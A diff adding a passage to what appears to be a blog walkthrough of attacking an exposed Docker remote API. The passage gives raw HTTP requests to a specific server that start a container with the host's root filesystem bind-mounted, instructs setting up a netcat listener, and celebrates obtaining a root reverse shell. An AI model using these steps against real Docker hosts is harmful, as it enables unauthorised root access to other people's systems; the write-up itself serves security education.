@@ -96,4 +96,49 @@ Content-Length: 207
 
 That's where the magic happens. Assuming that the user which is running the docker daemon is privileged and able to view and edit all files on the host system, we simply _map_ or _bind_ the root's directory to a directory create inside the container itself. Theoritically, we should be able to browse the **HOST**'s file system "/" from inside the container by navigating into "/root/hostroot".
 
+In case of a success container creation, the server's response will look like this:
+```
+HTTP/1.1 201 Created
+Server: nginx/1.10.3 (Ubuntu)
+Date: Tue, 03 Oct, 2017 15:54:16 GMT
+Content-Type: application/json
+Content-Length: 9140
+Connection: Close
 
+{"stream":"Step 1 : FROM ubuntu:16.04\n"}
+...
+SNIP
+...
+{"stream":"Removing intermediate container 51234bca51\n"}
+{"stream":"Successfuly built 00c522fa85c\n"}
+```
+
+Last but not least, starting the container:
+```
+POST /containers/89a1eeb4c9a48a4d3a7bc300fc0b6164d32f2bd65b84e15ef60954b8bb38125d/start HTTP/1.1
+Host: 108.61.210.185:8081
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/json
+Content-Length: 4
+
+{}
+```
+Make sure that you set up a netcat listener to receive the reverse TCP connection before starting the container.
+
+A success response will typically look like the following:
+```
+HTTP/1.1 204 No Content
+Server: nginx/1.10.3 (Ubuntu)
+Date: Tue, 03 Oct, 2017 15:56:16 GMT
+Content-Type: application/json
+Connection: Close
+```
+And we should be receiving a new connection with a root reverse shell. Hurraaay!
+![Root access to the container]({{https://github.com/fusionx3/fusionx3.github.io/blob/master/images/docker_2.png?raw=true | absolute_url)}})
+
+**Don't cheer up just yet, because we're still confined in the container.**
